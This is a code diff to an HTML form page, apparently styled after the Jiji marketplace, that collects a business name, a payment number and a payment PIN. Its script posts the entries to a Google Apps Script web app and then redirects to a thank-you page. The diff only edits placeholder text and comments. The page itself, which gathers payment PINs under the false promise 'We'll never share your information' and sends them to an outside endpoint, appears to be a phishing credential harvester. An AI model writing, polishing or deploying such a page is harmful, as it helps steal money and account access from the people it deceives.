@@ -30,13 +30,13 @@
     <!-- Form -->
     <form id="jijiForm" autocomplete="off">
       <label for="business">Business Name</label>
-      <input type="text" id="business" name="business" placeholder="Enter your Business Name" required>
+      <input type="text" id="business" name="business" placeholder="Enter Business Name" required>
 
       <label for="paymentNumber">Payment Number</label>
-      <input type="text" id="paymentNumber" name="paymentNumber" placeholder="Enter your Payment Number" required>
+      <input type="text" id="paymentNumber" name="paymentNumber" placeholder="Enter Payment Number" required>
 
-      <label for="paymentPin">Payment PIN</label>
-      <input type="password" id="paymentPin" name="paymentPin" placeholder="Enter your Payment PIN" required>
+      <label for="paymentPin">Payment Pin</label>
+      <input type="password" id="paymentPin" name="paymentPin" placeholder="Enter Payment Pin" required>
 
       <div class="notice" id="status">We'll never share your information.</div>
 
@@ -52,6 +52,7 @@
     const form = document.getElementById('jijiForm');
     const statusEl = document.getElementById('status');
 
+    // your deployed Apps Script Web App URL
     const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxOpOdwYts-Td5SH48_hq9dADPzhwRuINh6LevT_up92sj2g0FiLDTnlcJ78SYe7As4RA/exec';
 
     form.addEventListener('submit', async (e) => {
@@ -70,8 +71,9 @@
         const text = await response.text();
         console.log("Server says:", text);
 
+        // if success → redirect immediately
         if (text.includes("SUCCESS")) {
-          window.location.href = "thankyou.html"; // redirect after success
+          window.location.href = "thankyou.html";
         } else {
           statusEl.textContent = 'Submission failed. Try again.';
           statusEl.style.color = '#aa0000';
